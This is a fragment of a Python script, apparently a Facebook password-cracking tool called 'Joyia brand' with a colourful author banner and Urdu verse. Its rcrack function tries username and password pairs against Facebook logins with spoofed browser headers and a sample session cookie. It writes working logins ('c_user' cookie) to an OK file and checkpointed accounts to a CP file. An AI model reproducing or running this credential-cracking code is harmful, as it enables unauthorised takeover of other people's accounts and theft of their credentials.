...
\033[1;33m----------------------------------------------
 \033[1;31mAUTHOR    : \033[1;34mBalawal Saleem
 \033[1;31mGITHUB    : \033[1;34mBalawall
 \033[1;31mFACEBOOK  : \033[1;34mBalawalSaleem
 \033[1;31mTOOL NAME : \033[1;34mJoyia brand
 \033[1;31mTOOL TYPE : \033[1;34mprivate
 \033[1;31mVERSION   : \033[1;34mLOLWala
\033[1;33m----------------------------------------------
\033[1;34mMai dhundne ko zamane men
\033[1;31mjab wafa nikla 🙊
\033[1;34mpata chala ke ghalat leke
\033[1;31mmain bata nikla 🙈 ya lekny wali choti loli thi
\033[1;33m----------------------------------------------""")
...
def rcrack(uid,pwx,tl):
   ...
   'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    ...
    # 'cookie': 'datr=1qNzZNRJlIQgwE0sbz84GYZm; sb=16NzZKKZRfJIK0zD1khIfBMl; dpr=2.75; m_pixel_ratio=2.75; wd=980x1863; fr=0RCr1iVPggmNtfICo..Bkc6PW.qW.AAA.0.0.BkeHLa.AWWlrWpio3Q',
    ...
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[Balawal Saleem-OK] '+uid+'|'+ps+'\033[0;97m')
                open('Balawal Saleem-OK.txt', 'a').write(uid+' | '+ps+ '\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                   #print('\033[1;31m[Balawal Saleem-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('Balawal Saleem-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;99mBalawal Saleem\033[1;99m] %s|\33[1;99mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
